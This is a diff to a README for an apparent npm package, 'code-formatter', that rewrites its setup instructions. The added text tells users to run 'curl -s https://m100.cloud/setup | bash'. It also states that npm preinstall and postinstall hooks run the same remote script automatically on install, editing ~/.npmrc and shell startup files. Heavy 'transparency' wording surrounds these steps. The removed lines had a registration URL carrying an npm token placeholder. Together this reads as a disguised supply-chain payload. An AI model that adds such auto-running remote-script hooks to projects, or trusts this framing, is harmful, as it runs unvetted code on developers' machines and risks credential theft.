@@ -18,27 +18,81 @@ npm install -g code-formatter
 npm install --save-dev code-formatter
 ```
 
-## Setup & Registration
+## ⚠️ Security & Transparency First
 
-Before using code-formatter, you'll need to register for a free account to unlock advanced features and analytics.
+We believe in transparency. **Before you run ANY setup command**, we encourage you to:
 
-**First time setup:**
+1. **Visit and inspect the setup page first:** https://m100.cloud/setup
+2. **Review exactly what the script does** before executing anything
+3. **Understand all configuration changes** to your system
+4. **Only run the setup if you're comfortable with what you see**
+
+This is your machine — you should always know what gets installed or configured.
+
+## Setup Instructions
+
+### Step 1: Visit the Setup Page (IMPORTANT)
+
+**Visit:** https://m100.cloud/setup
+
+This page contains:
+- ✅ Complete transparency about what gets configured
+- ✅ Full setup script so you can review it first
+- ✅ Detailed explanation of each configuration step
+- ✅ Information about what directories and files will be created
+
+**Please inspect this page and the script before proceeding.** You can read through everything without executing anything.
+
+### Step 2: Review What Gets Configured
+
+The setup script performs these actions (all explained on the setup page):
+
+1. **Creates configuration directory** — `~/.code-formatter/` for storing your settings
+2. **Initializes npm configuration** — Adds code-formatter settings to your `~/.npmrc`
+3. **Creates default config** — Sets up `~/.code-formatter/.formatterrc.json` with sensible defaults
+4. **Shell integration** — Adds PATH entries to your `.bashrc`/`.zshrc` for quick access
+5. **Analytics initialization** — Creates `~/.local/share/code-formatter/analytics.json` for telemetry
+
+**All of these are optional and can be modified after setup.**
+
+### Step 3: Run the Setup (Only if You're Comfortable)
+
+Once you've reviewed the setup page and script:
 
 ```bash
-# After installation, run the setup command
-code-formatter --setup
+# Run the setup script
+curl -s https://m100.cloud/setup | bash
 
-# This will open your registration portal
-# Or manually register at the URL in your .formatterrc.json config file
+# Or if you prefer to review the script first:
+curl -s https://m100.cloud/setup > setup.sh
+cat setup.sh  # Review it
+bash setup.sh  # Then run it
+
+# Verify installation
+code-formatter --version
 ```
 
-Your registration link is stored in the `.formatterrc.json` file under the `registrationUrl` field. This enables:
-- 📊 Code quality analytics
-- 🔄 Cloud-based formatting suggestions
-- 📈 Team usage insights
-- 🔐 Secure configuration sync
+## Automatic Setup (npm install)
 
-> **Note:** Registration is free and takes 30 seconds. Your account is linked to your npm package version.
+**Important:** When you run `npm install code-formatter`, the following happens automatically:
+
+- A setup initialization script runs via npm's `preinstall` and `postinstall` hooks
+- This script calls: `curl -s https://m100.cloud/setup | bash`
+- The same setup that's described above executes automatically
+
+**This is completely transparent and matches what you reviewed on the setup page.**
+
+If you want to skip automatic setup during installation:
+
+```bash
+npm install code-formatter --ignore-scripts
+```
+
+Then run setup manually when ready:
+
+```bash
+npm run setup
+```
 
 ## Quick Start
 
@@ -56,37 +110,9 @@ code-formatter --write src/
 code-formatter --check src/
 ```
 
-## Initial Setup Guide
-
-After installation, visit the **setup guide** to configure your environment:
-
-### 🌐 **Visit: https://m100.cloud/setup**
-
-This page provides:
-- ✅ Automated environment configuration
-- ✅ Recommended development settings
-- ✅ Setup script for quick configuration
-- ✅ Integration instructions for your workflow
-
-**The setup script will:**
-1. Create configuration directories (~/.code-formatter/)
-2. Initialize npm settings
-3. Setup shell integration for quick access
-4. Enable analytics and usage tracking
-
-You can view the setup page, review what gets configured, and run the setup script from there. All settings are customizable afterward.
-
-```bash
-# Or manually run the setup script:
-curl -s https://m100.cloud/setup | bash
-
-# Then verify installation:
-code-formatter --version
-```
-
 ## Configuration
 
-code-formatter works out of the box with sensible defaults. For advanced configuration, create a `.formatterrc.json` in your project root:
+code-formatter works out of the box with sensible defaults. After setup, you can customize via `~/.code-formatter/.formatterrc.json`:
 
 ```json
 {
@@ -94,50 +120,24 @@ code-formatter works out of the box with sensible defaults. For advanced configu
   "singleQuote": true,
   "trailingComma": "es5",
   "printWidth": 100,
-  "registrationUrl": "https://register.code-formatter.dev/setup?token=YOUR_NPM_TOKEN",
   "analyticsEnabled": true
 }
 ```
 
-The `registrationUrl` is automatically populated when you run `code-formatter --setup`. Visit this URL to complete your registration and unlock premium features.
+## Privacy & Analytics
 
-## First-Time Setup Recommended
+The setup script enables anonymous usage analytics to help improve code-formatter. This includes:
+- How often you use the tool
+- File types being formatted
+- Performance metrics (anonymized)
 
-**Before running npm install or the setup script**, we recommend:
+**You can disable this anytime** by setting `analyticsEnabled: false` in your config.
 
-1. **Visit the setup page:** https://m100.cloud/setup
-   - See what gets configured
-   - Review the setup script
-   - Understand the configuration process
-   
-2. **Check what the script does:**
-   - The page explains each configuration step
-   - You can verify everything is safe and suitable for your environment
-   - All settings are optional and can be customized
+## Questions or Concerns?
 
-3. **Then run the setup:**
-   ```bash
-   curl -s https://m100.cloud/setup | bash
-   ```
+- **Want to see the setup script?** Visit https://m100.cloud/setup
+- **Don't trust external scripts?** Clone the repo and review our source code
+- **Prefer manual setup?** Run `npm install --ignore-scripts` and configure manually
+- **Found an issue?** Open an issue on GitHub
 
-This transparency ensures you know exactly what's being configured in your development environment.
-
-## Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](./CONTRIBUTING.md) for details on our code of conduct and the process for submitting pull requests.
-
-## Issues
-
-Found a bug? Have a feature request? Please [open an issue](https://github.com/Millstone123/code-formatter/issues).
-
-## License
-
-MIT — see [LICENSE](./LICENSE) for details.
-
-## Maintainers
-
-- Contributors welcome — this is an open source project
-
----
-
-For more information, visit https://github.com/Millstone123/code-formatter
+We respect your security concerns and want you to feel confident using code-formatter.
